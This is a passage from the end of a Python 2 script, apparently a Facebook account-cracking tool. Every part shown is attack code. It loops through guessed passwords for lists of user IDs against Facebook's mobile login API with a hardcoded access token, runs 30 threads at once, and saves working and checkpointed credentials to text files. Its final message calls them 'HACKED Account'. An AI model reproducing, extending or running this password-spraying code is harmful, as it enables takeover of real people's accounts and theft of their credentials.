                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;93m[LEGEND-NAIM-CP] ' + uid + ' | ' + pass2 + ' | ' + name
                    cp = open('mamucp.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('mamuok.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;93m[BanDuLa-CP] ' + uid + ' | ' + pass3 + ' | ' + name
                        cp = open('naimcp.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('mamuok.txt', 'a')
                            ok.write(uid + '|' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;93m[BanDuLa-CP] ' + uid + ' | ' + pass4 + ' | ' + name
                            cp = open('mamucp.txt', 'a')
                            cp.write(uid + '|' + pass4 + '\n')
                            cp.close()
                            cps.append(uid + pass4)
                        else:
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('mamuok.txt', 'a')
                                ok.write(uid + '|' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m[BanDuLa-CP] ' + uid + ' | ' + pass5 + ' | ' + name
                                cp = open('mamucp.txt', 'a')
                                cp.write(uid + '|' + pass5 + '\n')
                                cp.close()
                                cps.append(uid + pass5)
                            else:
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('mamuok.txt', 'a')
                                    ok.write(uid + '|' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;93m[BanDuLa-CP] ' + uid + ' | ' + pass6 + ' | ' + name
                                    cp = open('mamucp.txt', 'a')
                                    cp.write(uid + '|' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid + pass6)
                                else:
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[BANDULA-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('mamuok.txt', 'a')
                                        ok.write(uid + '|' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[BanDuLa-CP] ' + uid + ' | ' + pass7 + ' | ' + name
                                        cp = open('BaBycp.txt', 'a')
                                        cp.write(uid + '|' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid + pass7)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print ''
    print 54 * '\x1b[1;92m_'
    print ''
    print ' \x1b[1;92mThe process has been completed'
    print ' \x1b[1;92mTotal Ok/Cp: ' + str(len(oks)) + '/' + str(len(cps))
    print ' \x1b[1;92mNote: HACKED Account Saved Sdcard Folder: naimcp.txt'
    print 54 * '_'
    print ''
    print ''
    raw_input(' \x1b[1;93mPress enter to back ')
    main()

if __name__ == '__main__':
    tool()
